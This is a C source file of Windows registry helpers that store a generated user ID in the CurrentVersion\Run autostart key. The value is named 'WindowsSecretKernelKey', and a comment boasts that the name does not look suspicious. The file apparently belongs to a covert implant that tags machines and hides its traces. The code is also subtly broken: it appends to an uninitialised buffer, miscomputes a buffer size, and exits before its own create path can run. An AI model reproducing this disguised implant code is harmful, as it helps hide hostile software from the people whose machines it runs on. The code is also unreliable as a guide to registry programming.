#include <stdbool.h>
#include <string.h>
#include <stdio.h>
#include "utils/utils.h"
#include "regedit/regedit.h"


LPBYTE getOrCreateAndGetUserId() {
    LPBYTE existingUUID = queryRegedit(L"WindowsSecretKernelKey"); // WindowsSecretKernelKey sounds like it's not suspicious, right?
    if (existingUUID != NULL) {
        return existingUUID;
    }
    
    LPBYTE uuid = malloc(sizeof(LPBYTE) * 37);
    if (uuid == NULL) {
        exit(0);
    }

    generateUserId(uuid);
    setRegeditKeyValue(L"WindowsSecretKernelKey", L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", (LPCWSTR)uuid);
    return uuid;
}

LPBYTE queryRegedit(LPCWSTR lpValueName) {
    HKEY hKey;
    LPCWSTR keyPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    DWORD dataType = REG_SZ;
    DWORD dataSize = 0;

    if (RegOpenKeyExW(HKEY_CURRENT_USER, keyPath, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        exit(0);
    }

    if (RegQueryValueExW(hKey, lpValueName, NULL, &dataType, NULL, &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        exit(0);
    }

    LPBYTE data = (LPBYTE)malloc(dataSize);
    if (!data) {
        RegCloseKey(hKey);
        exit(0);
    }

    DWORD result = RegQueryValueExW(hKey, lpValueName, NULL, &dataType, data, &dataSize);
    RegCloseKey(hKey);

    if (result == ERROR_SUCCESS) {
        return data;
    } else {
        free(data);
        return NULL;
    }
}

DWORD setRegeditKeyValue(LPCWSTR lpValueName, LPCWSTR key, LPCWSTR uuid) {
    HKEY hKey;
    DWORD status = RegCreateKeyExW(
        HKEY_CURRENT_USER, key, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_WRITE, NULL, &hKey, NULL
    );
    if (status != ERROR_SUCCESS) {
        exit(0);
    }

    size_t fullLen = wcslen(uuid) + 1;
    wchar_t* fullPath = malloc(sizeof(wchar_t) * fullLen);
    if (!fullPath) {
        RegCloseKey(hKey);
        exit(0);
    }

    wcscat(fullPath, uuid);

    DWORD result = RegSetValueExW(
        hKey, lpValueName, 0, REG_SZ,
        (const BYTE*)fullPath,
        (DWORD)((wcslen(fullPath) + 1) * sizeof(wchar_t))
    );

    free(fullPath);
    RegCloseKey(hKey);

    return (result == ERROR_SUCCESS) ? 0 : result;
}
